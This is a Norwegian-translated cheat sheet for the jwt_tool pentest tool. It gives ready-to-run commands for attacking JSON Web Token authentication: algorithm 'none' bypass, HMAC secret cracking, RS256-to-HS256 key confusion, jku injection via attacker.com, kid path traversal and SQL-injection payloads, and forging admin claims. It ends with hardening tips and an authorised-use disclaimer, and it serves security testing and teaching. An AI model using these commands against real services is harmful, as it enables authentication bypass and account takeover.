<!-- language-home-navigation -->
[🏠 Norsk Hovedside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇬🇧 English](../README.md)

---


# 🪙 jwt_tool - Komplett jukseark

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
       ██╗██╗    ██╗████████╗    ████████╗ ██████╗  ██████╗ ██╗     
       ██║██║    ██║╚══██╔══╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
       ██║██║ █╗ ██║   ██║          ██║   ██║   ██║██║   ██║██║     
  ██   ██║██║███╗██║   ██║          ██║   ██║   ██║██║   ██║██║     
  ╚█████╔╝╚███╔███╔╝   ██║          ██║   ╚██████╔╝╚██████╔╝███████╗
   ╚════╝  ╚══╝╚══╝    ╚═╝          ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
        All-in-One JSON Web Token Manipulation & Exploitation Suite
```
<p align="center">
  <img src="https://img.shields.io/badge/jwt__tool-Token_Exploitation-blue?style=for-the-badge" alt="jwt_tool">
  <img src="https://img.shields.io/badge/Author-ticarpi-orange?style=for-the-badge" alt="ticarpi">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="Nettsikkerhet">
  <img src="https://img.shields.io/badge/License-GPLv3-purple?style=for-the-badge" alt="GPLv3">
</p>

<p align="center">
  <b>🪙 Kraftig Python CLI-verktøysett for å analysere, tukle, smi, skanne og knekke JSON Web Tokens (JWT)</b>
</p>

---

## 📋 Innholdsfortegnelse

- [Oversikt og JWT-anatomi](#-oversikt--jwt-anatomi)
- [Installasjon](#-installasjon)
- [Token Parsing & Inspection](#-token-parsing--inspection)
- [Automatisert sårbarhetsskanning (`-M at`)](#-automated-vulnerability-scanning--m-at)
- [Common Exploitation Scenarios](#-common-exploitation-scenarios)
  - [Algorithm Confusion / None Attack (`none`)](#algorithm-confusion--none-attack-none)
  - [HMAC Secret Key Cracking](#hmac-secret-key-cracking)
  - [Nøkkelforvirring: RS256 til HS256 med offentlig nøkkel](#key-confusion-rs256-to-hs256-with-public-key)
  - [Header Injection: JKU, X5U & JWK Spoofing](#header-injection-jku-x5u--jwk-spoofing)
  - [KID Injection (SQLi & Path Traversal)](#kid-injection-sqli--path-traversal)
- [Payload Tampering & Forging Claims](#-payload-tampering--forging-claims)
- [Hurtigreferansetabell](#-hurtigreferansetabell)
– [Defensive Considerations & Hardening](#-defensive-considerations--hardening)
– [Juridisk ansvarsfraskrivelse](#-juridisk ansvarsfraskrivelse)

---

## 🎯 Oversikt & JWT Anatomy

Et JSON Web Token (RFC 7519) består av tre Base64URL-kodede segmenter atskilt med prikker (`.`):
`header.payload.signature`

1. **Overskrift:** Identifiserer tokentype (`typ`) og signeringsalgoritme (`alg`, f.eks. `HS256`, `RS256`, `none`).
2. **Nyttelast:** Inneholder brukerkrav (`sub`, `role`, `admin`, `exp`).
3. **Signatur:** Kryptografisk verifiseringshash som forhindrer tukling på klientsiden.

Laget av **ticarpi**, **jwt_tool** automatiserer testing for arkitektur- og implementeringsfeil i arbeidsflyter for JWT-autentisering på tvers av APIer og moderne nettapplikasjoner.

---

## 📥 Installasjon
```bash
# Clone the repository
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool

# Install dependencies
pip install -r requirements.txt

# Run jwt_tool
python3 jwt_tool.py --help
```
---

## 🔍 Token Parsing & Inspeksjon

Dekod og inspiser overskriftsparametere og nyttelastkrav:
```bash
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOmZhbHNlfQ.signature
```
---

## ⚡ Automatisert sårbarhetsskanning (`-M at`)

Start automatiske playbook-skanninger som tester kjente sårbarheter mot en målnetttjeneste:
```bash
# Run All Tests (-M at) sending requests to web endpoint
python3 jwt_tool.py <JWT_TOKEN> \
  -M at \
  -u "https://api.target.com/user/profile" \
  -rh "Authorization: Bearer <JWT_TOKEN>"
```
*Tester utført:*
- Signaturstripping (ingen algoritmevarianter)
- RSA til HMAC nøkkelforvirring
– Kravsaukling (`admin=true`, rettighetseskalering)
- Injeksjon i `kid`, `jku`, `x5u` header
- Tom signaturhåndtering

---

## 💥 Vanlige utnyttelsesscenarier

### Algoritmeforvirring / ingen angrep (`none`)
Når backend-implementeringer godtar usignerte tokens:
```bash
# Forge token with 'none' algorithm and stripped signature
python3 jwt_tool.py <JWT_TOKEN> -X a
```
*Varianter testet automatisk:* `none`, `None`, `NONE`, `nOnE`.

### HMAC Secret Key Cracking
Når HS256/HS384/HS512 bruker en svak passordfrase:
```bash
# Dictionary attack using rockyou.txt
python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt
```
### Nøkkelforvirring: RS256 til HS256 med offentlig nøkkel
Hvis serveren signerer med RSA (RS256) men godtar HMAC (HS256) ved å bruke sitt offentlige sertifikat som den delte HMAC-nøkkelen:
```bash
# Forge token using server public key file
python3 jwt_tool.py <JWT_TOKEN> -X k -pk public.pem
```
### Header Injection: JKU, X5U & JWK Spoofing
Injeksjon av angriperkontrollerte nøkler eller URL-er:
```bash
# Inject attacker-controlled JWKS URL in jku header
python3 jwt_tool.py <JWT_TOKEN> -I -hc jku -hv "https://attacker.com/jwks.json" -S hs256 -k secret
```
### KID-injeksjon (SQLi & Path Traversal)
Hvis backend bruker `kid` (Key ID) overskriftsparameter direkte i databasespørringer eller filstier:
```bash
# Path traversal pointing to /dev/null (empty secret)
python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "/dev/null" -S hs256 -p ""

# SQL Injection in kid header to bypass signature verification
python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "key1' UNION SELECT 'my_secret'--" -S hs256 -p "my_secret"
```
---

## ✍️ Forfalskning av nyttelast og smikrav

Endre spesifikke kravverdier og si opp tokenet:
```bash
# Change claim 'admin' to true and 'role' to 'SuperAdmin' using known secret
python3 jwt_tool.py <JWT_TOKEN> \
  -T \
  -pc "admin" -pv "true" \
  -pc "role" -pv "SuperAdmin" \
  -k "secret_key"
```
---

## ⚡ Hurtigreferansetabell

| Mål | Kommando |
|----------------|--------|
| **Dekod og analyser token** | `python3 jwt_tool.py <JWT>` |
| **Alt-i-ett Playbook Scan** | `python3 jwt_tool.py <JWT> -M at -u <URL> -rh "Auth: Bearer <JWT>"` |
| **Crack HMAC Secret** | `python3 jwt_tool.py <JWT> -C -d rockyou.txt` |
| **Omgå uten algoritme** | `python3 jwt_tool.py <JWT> -X a` |
| **RS256 -> HS256 Forvirring** | `python3 jwt_tool.py <JWT> -X k -pk public.pem` |
| **Tukle nyttelast og skilt** | `python3 jwt_tool.py <JWT> -T -pc admin -pv true -k <KEY>` |
| **KID Path Traversal** | `python3 jwt_tool.py <JWT> -I -hc kid -hv "/dev/null" -S hs256 -p ""` |

---

## 🛡️ Defensive betraktninger og herding

1. **Streng algoritmehvitelisting:** Aldri godta `none` eller algoritmebytte. Bekreft eksplisitt forventede algoritmer (kun `RS256`).
2. **Avvis klientkontrollerte nøkler:** Ikke stol blindt på `jku`-, `jwk`- eller `x5u`-overskrifter fra uklarerte inndata uten strenge domenegodkjenningslister.
3. **Bruk sterke hemmeligheter:** Sørg for at HMAC-nøkler er minst 256 biter med høyentropi kryptografiske tilfeldige byte.

---

## ⚠️ Juridisk ansvarsfraskrivelse

> [!FORSIKTIG]
> jwt_tool er designet for autorisert penetrasjonstesting, API-sårbarhetsvurderinger og pedagogisk forskning. Å forfalske tokens for å få tilgang til uautoriserte systemer uten skriftlig tillatelse er strengt ulovlig.